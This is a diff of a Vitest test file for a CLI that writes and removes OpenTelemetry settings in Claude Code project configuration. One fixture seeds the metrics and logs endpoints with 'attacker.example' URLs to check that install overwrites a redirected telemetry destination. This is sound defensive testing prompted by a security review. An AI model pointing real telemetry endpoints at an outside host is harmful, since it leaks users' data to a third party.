@@ -1,4 +1,4 @@
-import { existsSync, mkdirSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, readdirSync, writeFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { guardRealSettings, json, read, type Sandbox, sandbox, tv } from "./helpers.ts";
@@ -37,6 +37,11 @@ const ENV = {
   OTEL_LOGS_EXPORTER: "otlp",
   OTEL_EXPORTER_OTLP_PROTOCOL: "http/json",
   OTEL_EXPORTER_OTLP_ENDPOINT: "http://127.0.0.1:4807/v1/otlp",
+  // Round 2 (security review H1): the signal-specific endpoints are pinned too, so a shared
+  // settings file cannot redirect one signal; traces are switched off.
+  OTEL_EXPORTER_OTLP_METRICS_ENDPOINT: "http://127.0.0.1:4807/v1/otlp/v1/metrics",
+  OTEL_EXPORTER_OTLP_LOGS_ENDPOINT: "http://127.0.0.1:4807/v1/otlp/v1/logs",
+  OTEL_TRACES_EXPORTER: "none",
 };
 const TOKEN = "cli-secret-Zq7Xw2Lr9Kd4Mn8Pv3Ts6Hb1Jc5Gf0Ye2U";
 
@@ -180,5 +185,128 @@ describe("install claude-code --otel", () => {
     expect(settings.env).toBeUndefined();
     expect(settings.otelHeadersHelper).toBeUndefined();
     expect(read(sb.projectSettings)).not.toContain("OTEL_");
+  });
+});
+
+// Round 2 (security review H1, H2 and roborev 6864 c).
+describe("install claude-code --otel: pinned endpoints", () => {
+  it("overwrites a conflicting endpoint a shared settings file already set, and shows it in the diff", async () => {
+    sb = sandbox();
+    write(
+      sb.projectSettings,
+      `${JSON.stringify({ env: { OTEL_EXPORTER_OTLP_METRICS_ENDPOINT: "http://attacker.example/m", OTEL_EXPORTER_OTLP_LOGS_ENDPOINT: "http://attacker.example/l" } }, null, 2)}\n`,
+    );
+    const dry = await tv(sb, ["install", "claude-code", ...PROJECT, "--otel", "--dry-run"]);
+    expect(dry.stdout).toContain("attacker.example");
+    const r = await tv(sb, ["install", "claude-code", ...PROJECT, "--otel", "--yes"]);
+    expect(r.code, r.stderr).toBe(0);
+    expect(env(sb.projectSettings)).toMatchObject(ENV);
+    expect(read(sb.projectSettings)).not.toContain("attacker.example");
+  });
+
+  it("pins the signal endpoints to the --url port and gives the helper the same TASKVILLE_URL", async () => {
+    sb = sandbox();
+    const r = await tv(sb, [
+      "install",
+      "claude-code",
+      ...PROJECT,
+      "--otel",
+      "--yes",
+      "--url",
+      "http://localhost:5123",
+    ]);
+    expect(r.code, r.stderr).toBe(0);
+    const e = env(sb.projectSettings);
+    expect(e.OTEL_EXPORTER_OTLP_METRICS_ENDPOINT).toBe("http://127.0.0.1:5123/v1/otlp/v1/metrics");
+    expect(e.OTEL_EXPORTER_OTLP_LOGS_ENDPOINT).toBe("http://127.0.0.1:5123/v1/otlp/v1/logs");
+    expect(e.OTEL_TRACES_EXPORTER).toBe("none");
+    expect(json(sb.projectSettings).otelHeadersHelper).toContain("http://127.0.0.1:5123");
+  });
+});
+
+describe("install claude-code --otel: scope", () => {
+  it.each([
+    ["--scope", "user"],
+    ["--scope", "other"],
+  ])("fails with a usage error before any write for %s %s", async (flag, scope) => {
+    sb = sandbox();
+    for (const extra of [["--yes"], ["--dry-run"], []]) {
+      const r = await tv(sb, ["install", "claude-code", flag, scope, "--otel", ...extra]);
+      expect(r.code, extra.join(" ")).not.toBe(0);
+      expect(r.stderr).toMatch(/--otel/);
+      expect(r.stderr).toMatch(/project/);
+    }
+    // Nothing under the temp HOME: no settings, no Taskville home, no helper copy.
+    expect(readdirSync(sb.home)).toEqual([]);
+    expect(existsSync(sb.userSettings)).toBe(false);
+  });
+
+  it("fails without --scope too (no default scope is assumed for --otel)", async () => {
+    sb = sandbox();
+    const r = await tv(sb, ["install", "claude-code", "--otel", "--yes"]);
+    expect(r.code).not.toBe(0);
+    expect(readdirSync(sb.home)).toEqual([]);
+  });
+});
+
+describe("uninstall claude-code after install --otel", () => {
+  const uninstall = () => tv(sb, ["uninstall", "claude-code", ...PROJECT, "--yes"]);
+
+  it("restores the file exactly when nothing else changed", async () => {
+    sb = sandbox();
+    const original = `${JSON.stringify({ model: "opus", env: { MY_VAR: "keep-me" } }, null, 2)}\n`;
+    write(sb.projectSettings, original);
+    await tv(sb, ["install", "claude-code", ...PROJECT, "--otel", "--yes"]);
+    expect(env(sb.projectSettings)).toMatchObject(ENV);
+    const r = await uninstall();
+    expect(r.code, r.stderr).toBe(0);
+    expect(read(sb.projectSettings)).toBe(original);
+  });
+
+  it("removes exactly the env keys and otelHeadersHelper that install wrote, keeping later edits", async () => {
+    sb = sandbox();
+    write(sb.projectSettings, `${JSON.stringify({ env: { MY_VAR: "keep-me" } }, null, 2)}\n`);
+    await tv(sb, ["install", "claude-code", ...PROJECT, "--otel", "--yes"]);
+    // Edit after install: a new setting, a new env var, and the user's own collector replacing
+    // one pinned value (which is then no longer what install wrote, so it stays).
+    const edited = json(sb.projectSettings);
+    edited.model = "sonnet";
+    edited.env = {
+      ...(edited.env as object),
+      LATER: "1",
+      OTEL_EXPORTER_OTLP_LOGS_ENDPOINT: "https://collector.corp.example/logs",
+    };
+    write(sb.projectSettings, `${JSON.stringify(edited, null, 2)}\n`);
+    const r = await uninstall();
+    expect(r.code, r.stderr).toBe(0);
+    const after = json(sb.projectSettings);
+    expect(after.model).toBe("sonnet");
+    expect(after.otelHeadersHelper).toBeUndefined();
+    expect(after.env).toEqual({
+      MY_VAR: "keep-me",
+      LATER: "1",
+      OTEL_EXPORTER_OTLP_LOGS_ENDPOINT: "https://collector.corp.example/logs",
+    });
+    expect(read(sb.projectSettings)).not.toContain("CLAUDE_CODE_ENABLE_TELEMETRY");
+  });
+
+  it("drops an env object that becomes empty and leaves a look-alike helper alone", async () => {
+    sb = sandbox();
+    await tv(sb, ["install", "claude-code", ...PROJECT, "--otel", "--yes"]);
+    const edited = json(sb.projectSettings);
+    edited.model = "sonnet"; // forces the structural path, not the byte-for-byte restore
+    write(sb.projectSettings, `${JSON.stringify(edited, null, 2)}\n`);
+    const r = await uninstall();
+    expect(r.code, r.stderr).toBe(0);
+    const after = json(sb.projectSettings);
+    expect(after.env).toBeUndefined();
+    expect(after.otelHeadersHelper).toBeUndefined();
+    expect(after.model).toBe("sonnet");
+
+    const own = { otelHeadersHelper: "/usr/local/bin/my-headers", env: { MY_VAR: "1" } };
+    write(sb.projectSettings, `${JSON.stringify(own, null, 2)}\n`);
+    const again = await uninstall();
+    expect(again.code, again.stderr).toBe(0);
+    expect(json(sb.projectSettings)).toEqual(own);
   });
 });
